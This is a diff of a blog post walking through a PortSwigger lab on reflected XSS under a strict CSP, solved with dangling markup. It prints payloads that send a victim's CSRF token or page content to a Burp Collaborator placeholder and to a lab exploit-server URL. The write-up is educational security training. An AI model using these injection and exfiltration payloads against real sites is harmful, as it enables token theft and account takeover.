@@ -1,11 +1,16 @@
-
-Today is nearly two years of the first Portswigger Web Security I've solved, I solved the last one. In this blog post, I'll share how I solve it.
+---
+title: Reflected XSS protected by very strict CSP, with dangling markup attack
+date: 2023-11-25 00:34:00 +0800
+categories: [Web, XSS]
+tags: [Web, Portswigger]
+---
+Today is nearly two years since the first Portswigger Web Security was solved, I solved the last one. In this blog post, I'll share how I solve it.
 
 ## Description of the Lab
 
 - Lab Level: Expert
 
-This lab using a strict [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) that blocks outgoing requests to external web sites.
+This lab uses a strict [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) that blocks outgoing requests to external websites.
 
 To solve the lab, first perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the CSP and exfiltrates a simulated victim user's [CSRF](https://portswigger.net/web-security/csrf) token using Burp Collaborator. You then need to change the simulated user's email address to `hacker@evil-user.net`.
 
@@ -15,7 +20,7 @@ You must label your vector with the word "Click" in order to induce the simulate
 
 You can log in to your own account using the following credentials: `wiener:peter`
 
-The lab has CSP `Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';` which make it harder to be exploited because it prevent all the access to out domains although you can inject HTML tags like `img` or `table`  
+The lab has CSP `Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';` which make it harder to be exploited because it prevents all the access to out domains although you can inject HTML tags like `img` or `table`  
 
 The vulnerable parameter is `email` in endpoint `/my-account/change-email` and the XSS payload is being reflected in the `/my-account`
 
@@ -23,7 +28,7 @@ The vulnerable parameter is `email` in endpoint `/my-account/change-email` and t
 
 Portswigger official solution is to use a payload to exploit dangling markup attack by sending `base` tag with attribute `target='` ending in single quote which will make the rest of the page being sent to the exploit server or Burp collaborator client abusing the same `eamil` parameter with link `a` tag as following:
 
-```js
+```javascript
 <script>
 if(window.name) {
 		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
@@ -58,7 +63,7 @@ The exploit scenario in my mind:
 
 After trying many things I come thought a writeup called [Postcards from the post-XSS world (2011)](https://lcamtuf.coredump.cx/postxss/) indeed it was old but I really was determine to solve it. I a section the witter talk about how you can inject a `form` tag so the parser will ignore the first one and use the one that I craft to get the CSRF token and start with: 
 
-```js 
+```javascript 
 "></form><form%20class="login-form"%20name="evil-form"%20action="https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log"%20method="POST">
 ```
 
@@ -66,7 +71,7 @@ After some tries and playing with HTML I know all the factors and how it suppose
 
 ![[Pasted image 20231125122402.png]]
 
-```js
+```javascript
 %22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log%22%20method=%22POST%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E
 ```
 
